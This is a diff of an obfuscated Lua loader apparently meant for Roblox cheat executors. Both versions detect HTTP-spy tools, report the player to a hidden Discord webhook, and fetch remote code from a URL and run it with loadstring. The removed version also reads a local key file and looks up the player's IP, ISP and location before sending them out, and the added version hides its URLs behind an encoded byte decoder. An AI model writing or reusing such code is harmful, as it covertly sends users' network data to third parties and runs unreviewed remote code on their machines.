@@ -1,67 +1,49 @@
-local function _D(h)
-    local s = ""
-    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
-    return s
+local _0x1 = bit32 or {bxor = function(a,b) return a + b end}
+local function _0xDE(_d, _k)
+    local _r = ""
+    for _i = 1, #_d do
+        _r = _r .. string.char(_0x1.bxor(_d[_i], _k) - _i)
+    end
+    return _r
 end
 
-local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-local _L = game:GetService("Players").LocalPlayer
-local _H = game:GetService("HttpService")
+local _0xK = 168
+local _0xS1 = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 231, 214, 218, 237, 211, 207, 207, 149, 210, 201, 202, 200, 215, 202, 202, 212, 211, 202, 203, 211, 146, 214, 210, 208, 142, 222, 210, 213, 218, 201, 211, 211, 214, 202, 202, 203, 201, 202, 206, 206, 199, 149, 201, 201, 215, 218, 208, 141, 205, 201, 212, 197, 200, 203}, _0xK)
+local _0xS2 = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 231, 214, 218, 237, 211, 207, 207, 149, 210, 201, 202, 200, 215, 202, 202, 212, 211, 202, 203, 211, 146, 206, 211, 212, 201, 203, 208, 222, 210, 213, 218, 201, 211, 211, 214, 202, 202, 203, 201, 202, 206, 206, 199, 149, 201, 201, 215, 218, 208, 141, 205, 193, 200}, _0xK)
+local _0xAL = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 217, 222, 212, 210, 210, 201, 213, 215, 141, 214, 202, 216, 142, 214, 202, 213, 210, 202, 200, 216, 212, 146, 184, 180, 184, 187, 178, 185, 181, 181, 188, 185, 181, 183, 183, 182, 182, 183, 189, 186, 184, 186, 178, 185, 179, 185, 187, 180, 141, 206, 212, 183, 211, 203, 179, 185, 182, 187, 200, 207, 201, 184, 188, 189, 209, 215, 185, 181, 188, 205, 185, 177, 210, 213, 183, 213, 184, 184, 177, 215, 215, 188, 212, 186, 212, 187, 186, 210, 183, 186, 216, 219, 185, 221, 222, 187, 180, 211, 221, 219, 225, 226, 184, 222, 219, 212, 221, 220, 224, 215, 225, 212}, _0xK)
 
-local function _CHECK_SPY()
+local _L = game:GetService("Players").LocalPlayer
+local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+local function _SC()
+    local ok, info = pcall(debug.getinfo, 1)
+    local src = (ok and info and info.source) or ""
+    if not string.find(src:lower(), "easyrpglol/nazarkusrpg", 1, true) then return "ERR_SRC" end
     if not _req then return false end
-    local ok, info = pcall(debug.getinfo, _req)
-    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
-    if debug.getinfo(game.HttpGet).source ~= "=[C]" then return "HOOKED_HTTPGET" end
-    local cg = game:GetService("CoreGui")
-    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy"}) do
-        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_DETECTED_" .. n end
+    local ok2, inf2 = pcall(debug.getinfo, _req)
+    if ok2 and inf2 and inf2.source ~= "=[C]" then return "ERR_ENV" end
+    for _, v in ipairs({"HttpSpy", "SimpleSpy", "VGG Spy"}) do
+        if getgenv()[v] then return "ERR_DEB" end
     end
     return false
 end
 
-local _spy_err = _CHECK_SPY()
-
-if _spy_err then
-    local _A = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
-    local _I_API = "http://ip-api.com/json/"
-    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
-    local ni = {} pcall(function() local r = _req({Url = _I_API, Method = "GET"}) if r.Success then ni = _H:JSONDecode(r.Body) end end)
-    
-    pcall(function()
-        _req({
-            Url = _A, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = _H:JSONEncode({
-                embeds = {{
-                    title = "🚨 Security Alert: Interceptor Detected",
-                    color = 16711680,
-                    fields = {
-                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
-                        {name = "Device Key", value = "```" .. tk .. "```", inline = false},
-                        {name = "Network Info", value = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false}
-                    }
-                }}
-            })
-        })
-    end)
-    _L:Kick("Security Tamper Detected.")
-    while true do end return
+local _err = _SC()
+if _err then
+    if _err ~= "ERR_SRC" then
+        pcall(function()
+            _req({Url = _0xAL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({embeds = {{title = "Security Violation", description = "User: ".._L.Name.."\nReason: ".._err, color = 16711680}}})})
+        end)
+    end
+    _L:Kick("Security: "..tostring(_err))
+    return
 end
 
-local _TS = game:GetService("TestService")
-local _STORAGE = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
-_STORAGE.Name = "__NK_RUNTIME"
-local _AUTH = Instance.new("StringValue", _STORAGE)
-_AUTH.Name = _L.Name
-_AUTH.Value = "V8_SECURE_TOKEN_VALID"
-shared._NK_LOADER_AUTH = "V8_SECURE_TOKEN_VALID"
-
-local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F727067")
-local ok, res = pcall(function() return game:HttpGet(_G) end)
-if ok and res then
-    local f = loadstring(res)
-    if f then task.spawn(f) end
+getgenv()._NK_SESS = game:GetService("HttpService"):GenerateGUID(false)
+local s, c = pcall(function() return game:HttpGet(_0xS2) end)
+if s and c then
+    local f = loadstring(c)
+    if f then pcall(f) end
 else
-    _L:Kick("Connection Error 0x82")
+    _L:Kick("Auth Fail")
 end
